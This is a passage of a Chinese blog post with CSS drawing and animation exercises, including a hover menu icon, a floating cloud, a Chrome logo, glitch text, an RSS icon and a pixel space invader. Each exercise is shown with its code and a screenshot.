src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_10.png"></p><h1 id="三根线css"><a href="#三根线css" class="headerlink" title="三根线css"></a>三根线css</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;warp&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;one&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;two&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;three&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">.warp&#123;width: 170px;height: 150px;position: relative; margin-left: 50%; margin-top: -15%; transform: translate(-50%,-50%);background-color: pink;&#125;</span><br><span class="line">.one, .two, .three&#123;width: 130px;height: 2px;margin: 0 auto; background-color: white; position: absolute;top: 20%;left: 10%;transition:all 1s;&#125;</span><br><span class="line">.two&#123;top: 50%;&#125;</span><br><span class="line">.three&#123;top: 80%;&#125;</span><br><span class="line">.warp:hover .one&#123;top: 80%;opacity: 0;&#125;</span><br><span class="line">.warp:hover .two&#123;top: 20%;transform: rotate(45deg); transform-origin: left; width: 126px&#125;</span><br><span class="line">.warp:hover .three&#123;transform: rotate(-45deg);transform-origin: left; width: 126px;&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img.webp"></p><h1 id="漂浮的云css"><a href="#漂浮的云css" class="headerlink" title="漂浮的云css"></a>漂浮的云css</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;cloud&quot;</span>&gt;</span>乌云<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">.cloud&#123;</span><br><span class="line">position: absolute;</span><br><span class="line">top: 50%;</span><br><span class="line">left: 50%;</span><br><span class="line">transform: translate(-50%,-50%);</span><br><span class="line">width: 150px;</span><br><span class="line">height: 200px;</span><br><span class="line">text-align: center;</span><br><span class="line">background-color: pink;</span><br><span class="line">border-radius: 10px;</span><br><span class="line">&#125;</span><br><span class="line">.cloud::before&#123;</span><br><span class="line">position: absolute;</span><br><span class="line">content: &#x27;&#x27;;</span><br><span class="line">background-color: white;</span><br><span class="line">width: 30px;</span><br><span class="line">height: 30px;</span><br><span class="line">top: 40%;</span><br><span class="line">left: 33%;</span><br><span class="line">z-index: 2;</span><br><span class="line">border-radius: 50%;</span><br><span class="line">transform: translate(-50%,-50%);</span><br><span class="line">box-shadow: 19px 6px 0px 1px white, 14px -13px 0 1px white, 37px -6px 0px -2px white, 52px 4px 0 -4px white, 37px 7px 0 -3px white, 20px -20px #ddd, 38px -12px 0 -1px #ddd, 54px -3px 0 -4px #DDD;</span><br><span class="line">animation: cloud-move 3s ease-in-out infinite;</span><br><span class="line">&#125;</span><br><span class="line">.cloud::after&#123;</span><br><span class="line">content: &#x27;&#x27;;</span><br><span class="line">background-color: rgba(0,0,0,0.6);</span><br><span class="line">position: absolute;</span><br><span class="line">top: 70%;</span><br><span class="line">left: 50%;</span><br><span class="line">width: 50px;</span><br><span class="line">height: 6px;</span><br><span class="line">border-radius: 50%;</span><br><span class="line">transform: translate(-50%,-50%);</span><br><span class="line">animation: shadow 3s ease-in-out infinite;</span><br><span class="line">&#125;</span><br><span class="line">@keyframes cloud-move&#123;</span><br><span class="line">50%&#123;transform: translate(-50%,-10%)&#125;;</span><br><span class="line">100%&#123;transform: translate(-50%,-50%);&#125;;</span><br><span class="line">&#125;</span><br><span class="line">@keyframes shadow&#123;</span><br><span class="line">50%&#123;transform: translate(-50%,-50%) scale(0.6);background-color: rgba(0,0,0,0.3)&#125;</span><br><span class="line">100%&#123;transform: translate(-50%,-50%) scale(1);background-color: rgba(0,0,0,0.6)&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_1.webp"></p><h1 id="chrome-css"><a href="#chrome-css" class="headerlink" title="chrome css"></a>chrome css</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;chrome&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">.chrome&#123;</span><br><span class="line">position: absolute;</span><br><span class="line">top: 50%;left: 50%;</span><br><span class="line">width: 180px;height: 180px;</span><br><span class="line">transform: translate(-50%, -50%);</span><br><span class="line">box-shadow:0 0px 4px #999,0 0 2px #ddd inset;</span><br><span class="line">border-radius:50%;</span><br><span class="line">background-image:</span><br><span class="line">radial-gradient(#4FACF5 0%,#2196F3 28%, transparent 28%), </span><br><span class="line">radial-gradient(#fff 33%,transparent 33%), </span><br><span class="line">linear-gradient(-50deg,yellow 34%, transparent 34%),</span><br><span class="line">linear-gradient(60deg,green 34%,transparent 34%),</span><br><span class="line">linear-gradient(176deg,red 34%,transparent 34%),</span><br><span class="line">linear-gradient(360deg,green 34%,transparent 34%),</span><br><span class="line">linear-gradient(261deg,yellow 34%,transparent 34%),</span><br><span class="line">linear-gradient(98deg,red 34%,transparent 34%);</span><br><span class="line">background-position:0 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_11.png" alt="img_11.png"></p><h1 id="乱码的字css"><a href="#乱码的字css" class="headerlink" title="乱码的字css"></a>乱码的字css</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;text-magic&quot;</span> <span class="attr">data-word</span>=<span class="string">&quot;CSSTextMagic&quot;</span>&gt;</span>CSSTextMagic<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;white&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">.text-magic&#123;</span><br><span class="line">          position: absolute;</span><br><span class="line">          top: 50%;left: 50%;</span><br><span class="line">          transform: translate(-50%, -50%);</span><br><span class="line">          width:300px;</span><br><span class="line">          font-size:36px;</span><br><span class="line">          font-family:Raleway, Verdana , Arial;</span><br><span class="line">        &#125;</span><br><span class="line">        .white&#123;</span><br><span class="line">          position:absolute;</span><br><span class="line">          left:0;</span><br><span class="line">          top:15px;</span><br><span class="line">          width:100%;</span><br><span class="line">          height:3px;</span><br><span class="line">          background:#fff;</span><br><span class="line">          z-index:4;</span><br><span class="line">          animation:whiteMove 3s ease-out infinite;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .text-magic:before&#123;</span><br><span class="line">          content:attr(data-word);</span><br><span class="line">          position:absolute;</span><br><span class="line">          top:0;</span><br><span class="line">          left:0.5px;</span><br><span class="line">          height:0px;</span><br><span class="line">          color:rgba(0,0,0,.9);</span><br><span class="line">          overflow:hidden;</span><br><span class="line">          z-index:2;</span><br><span class="line">          animation:redShadow 1s ease-in infinite;</span><br><span class="line">          -webkit-filter:contrast(200%);</span><br><span class="line">          text-shadow:0.1px 0 0 red;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .text-magic:after&#123;</span><br><span class="line">          content:attr(data-word);</span><br><span class="line">          position:absolute;</span><br><span class="line">          top:0;</span><br><span class="line">          left:-3px;</span><br><span class="line">          height:36px;</span><br><span class="line">          color:rgba(0,0,0,.8);</span><br><span class="line">          overflow:hidden;</span><br><span class="line">          z-index:3;</span><br><span class="line">          background:rgba(255,255,255,.9);</span><br><span class="line">          animation:redHeight 1.5s ease-out infinite;</span><br><span class="line">          -webkit-filter:contrast(200%);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @keyframes redShadow&#123;</span><br><span class="line">          20%&#123;</span><br><span class="line">            height:32px;</span><br><span class="line">          &#125;</span><br><span class="line">          60%&#123;</span><br><span class="line">            height:6px;</span><br><span class="line">          &#125;</span><br><span class="line">          100%&#123;</span><br><span class="line">            height:42px;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @keyframes redHeight&#123;</span><br><span class="line">          20%&#123;</span><br><span class="line">            height:42px;</span><br><span class="line">          &#125;</span><br><span class="line">          35%&#123;</span><br><span class="line">            height:12px;</span><br><span class="line">          &#125;</span><br><span class="line">          50%&#123;</span><br><span class="line">            height:40px;</span><br><span class="line">          &#125;</span><br><span class="line">          60%&#123;</span><br><span class="line">            height:20px;</span><br><span class="line">          &#125;</span><br><span class="line">          70%&#123;</span><br><span class="line">            height:34px;</span><br><span class="line">          &#125;</span><br><span class="line">          80%&#123;</span><br><span class="line">            height:22px;</span><br><span class="line">          &#125;</span><br><span class="line">          100%&#123;</span><br><span class="line">            height:0px;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @keyframes whiteMove&#123;</span><br><span class="line">          8%&#123;</span><br><span class="line">            top:38px;</span><br><span class="line">          &#125;</span><br><span class="line">          10%&#123;</span><br><span class="line">            top:8px;</span><br><span class="line">          &#125;</span><br><span class="line">          12%&#123;</span><br><span class="line">            top:42px;</span><br><span class="line">          &#125;</span><br><span class="line">          99%&#123;</span><br><span class="line">            top:36px;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_2.webp"></p><h1 id="Infinity"><a href="#Infinity" class="headerlink" title="Infinity"></a>Infinity</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#infinity</span> &#123;</span><br><span class="line">      <span class="attribute">position</span>: relative;</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">212px</span>;</span><br><span class="line">      <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">      <span class="attribute">box-sizing</span>: content-box;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#infinity</span><span class="selector-pseudo">:before</span>,</span><br><span class="line">    <span class="selector-id">#infinity</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">      <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="attribute">box-sizing</span>: content-box;</span><br><span class="line">      <span class="attribute">position</span>: absolute;</span><br><span class="line">      <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">      <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">60px</span>;</span><br><span class="line">      <span class="attribute">height</span>: <span class="number">60px</span>;</span><br><span class="line">      <span class="attribute">border</span>: <span class="number">20px</span> solid red;</span><br><span class="line">      <span class="attribute">border-radius</span>: <span class="number">50px</span> <span class="number">50px</span> <span class="number">0</span> <span class="number">50px</span>;</span><br><span class="line">      <span class="attribute">transform</span>: <span class="built_in">rotate</span>(-<span class="number">45deg</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#infinity</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">      <span class="attribute">left</span>: auto;</span><br><span class="line">      <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">      <span class="attribute">border-radius</span>: <span class="number">50px</span> <span class="number">50px</span> <span class="number">50px</span> <span class="number">0</span>;</span><br><span class="line">      <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">45deg</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_12.png" alt="img_12.png"></p><h1 id="RSS-Feed"><a href="#RSS-Feed" class="headerlink" title="RSS Feed"></a>RSS Feed</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#rss</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">20em</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">20em</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">3em</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#ff0000</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">14px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-id">#rss</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">5em</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">5em</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#fff</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">11.5em</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">3.5em</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-id">#rss</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#ff0000</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">13em</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">13em</span>;</span><br><span class="line">    <span class="attribute">top</span>: -<span class="number">2em</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">3.8em</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">2.5em</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">box-shadow</span>: </span><br><span class="line">      -<span class="number">2em</span> <span class="number">2em</span> <span class="number">0</span> <span class="number">0</span> <span class="number">#fff</span> inset, </span><br><span class="line">      -<span class="number">4em</span> <span class="number">4em</span> <span class="number">0</span> <span class="number">0</span> <span class="number">#ff0000</span> inset,</span><br><span class="line">      -<span class="number">6em</span> <span class="number">6em</span> <span class="number">0</span> <span class="number">0</span> <span class="number">#fff</span> inset</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_13.png" alt="img_13.png"></p><h1 id="奖章"><a href="#奖章" class="headerlink" title="奖章"></a>奖章</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#badge-ribbon</span> &#123;</span><br><span class="line">     <span class="attribute">position</span>: relative;</span><br><span class="line">     <span class="attribute">background</span>: red;</span><br><span class="line">     <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">     <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">     <span class="attribute">border-radius</span>: <span class="number">50px</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="selector-id">#badge-ribbon</span><span class="selector-pseudo">:before</span>,</span><br><span class="line">   <span class="selector-id">#badge-ribbon</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">     <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">     <span class="attribute">position</span>: absolute;</span><br><span class="line">     <span class="attribute">border-bottom</span>: <span class="number">70px</span> solid red;</span><br><span class="line">     <span class="attribute">border-left</span>: <span class="number">40px</span> solid transparent;</span><br><span class="line">     <span class="attribute">border-right</span>: <span class="number">40px</span> solid transparent;</span><br><span class="line">     <span class="attribute">top</span>: <span class="number">70px</span>;</span><br><span class="line">     <span class="attribute">left</span>: -<span class="number">10px</span>;</span><br><span class="line">     <span class="attribute">transform</span>: <span class="built_in">rotate</span>(-<span class="number">140deg</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="selector-id">#badge-ribbon</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">     <span class="attribute">left</span>: auto;</span><br><span class="line">     <span class="attribute">right</span>: -<span class="number">10px</span>;</span><br><span class="line">     <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">140deg</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_14.png" alt="img_14.png"></p><h1 id="像素怪"><a href="#像素怪" class="headerlink" title="像素怪"></a>像素怪</h1><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#space-invader &#123;</span></span><br><span class="line">      box-shadow:<span class="number"> 0 </span>0<span class="number"> 0 </span>1em red,</span><br><span class="line">     <span class="number"> 0 </span>1em<span class="number"> 0 </span>1em red,</span><br><span class="line">      -2.5em 1.5em<span class="number"> 0 </span>.5em red,</span><br><span class="line">      2.5em 1.5em<span class="number"> 0 </span>.5em red,</span><br><span class="line">      -3em -3em<span class="number"> 0 </span>0 red,</span><br><span class="line">      3em -3em<span class="number"> 0 </span>0 red,</span><br><span class="line">      -2em -2em<span class="number"> 0 </span>0 red,</span><br><span class="line">      2em -2em<span class="number"> 0 </span>0 red,</span><br><span class="line">      -3em -1em<span class="number"> 0 </span>0 red,</span><br><span class="line">      -2em -1em<span class="number"> 0 </span>0 red,</span><br><span class="line">      2em -1em<span class="number"> 0 </span>0 red,</span><br><span class="line">      3em -1em<span class="number"> 0 </span>0 red,</span><br><span class="line">      -4em<span class="number"> 0 </span>0<span class="number"> 0 </span>red,</span><br><span class="line">      -3em<span class="number"> 0 </span>0<span class="number"> 0 </span>red,</span><br><span class="line">      3em<span class="number"> 0 </span>0<span class="number"> 0 </span>red,</span><br><span class="line">      4em<span class="number"> 0 </span>0<span class="number"> 0 </span>red,</span><br><span class="line">      -5em 1em<span class="number"> 0 </span>0 red,</span><br><span class="line">      -4em 1em<span class="number"> 0 </span>0 red,</span><br><span class="line">      4em 1em<span class="number"> 0 </span>0 red,</span><br><span class="line">      5em 1em<span class="number"> 0 </span>0 red,</span><br><span class="line">      -5em 2em<span class="number"> 0 </span>0 red,</span><br><span class="line">      5em 2em<span class="number"> 0 </span>0 red,</span><br><span class="line">      -5em 3em<span class="number"> 0 </span>0 red,</span><br><span class="line">      -3em 3em<span class="number"> 0 </span>0 red,</span><br><span class="line">      3em 3em<span class="number"> 0 </span>0 red,</span><br><span class="line">      5em 3em<span class="number"> 0 </span>0 red,</span><br><span class="line">      -2em 4em<span class="number"> 0 </span>0 red,</span><br><span class="line">      -1em 4em<span class="number"> 0 </span>0 red,</span><br><span class="line">      1em 4em<span class="number"> 0 </span>0 red,</span><br><span class="line">      2em 4em<span class="number"> 0 </span>0 red;</span><br><span class="line">      background: red;</span><br><span class="line">      width: 1em;</span><br><span class="line">      height: 1em;</span><br><span class="line">      overflow: hidden;</span><br><span class="line">      margin: 50px<span class="number"> 0 </span>70px 65px;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/Blog/2017/12/21/essay/%E8%87%AA%E5%B7%B1%E7%BB%83%E4%B9%A0%E7%9A%84css%E5%8A%A8%E7%94%BB%EF%BC%88%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%89/index/img_15.png" alt="img_15.png"></p><h1 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#magnifying-glass</span> &#123;</span><br><span class="line">      <span class="attribute">font-size</span>: <span class="number">10em</span>;</span><br><span class="line">      <span class="attribute">display</span>: inline-block;</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">0.4em</span>;</span><br><span class="line">      <span class="attribute">box-sizing</span>: content-box;</span><br><span class="line">      <span class="attribute">height</span>: <span class="number">0.4em</span>;</span><br><span class="line">      <span class="attribute">border</span>: <span class="number">0.1em</span> solid red;</span><br><span class="line">      <span class="attribute">position</span>: relative;</span><br><span class="line">      <span class="attribute">border-radius</span>: <span class="number">0.35em</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-id">#magnifying-glass</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">      <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="attribute">display</span>: inline-block;</span><br><span class="line">      <span class="attribute">position</span>: absolute;</span><br><span class="line">      <span class="attribute">right</span>: -<span class="number">0.25em</span>;</span><br><span class="line">      <span class="attribute">bottom</span>: -<span class="number">0.1em</span>;</span><br><span class="line">      <span class="attribute">border-width</span>: <span class="number">0</span>;</span><br><span class="line">   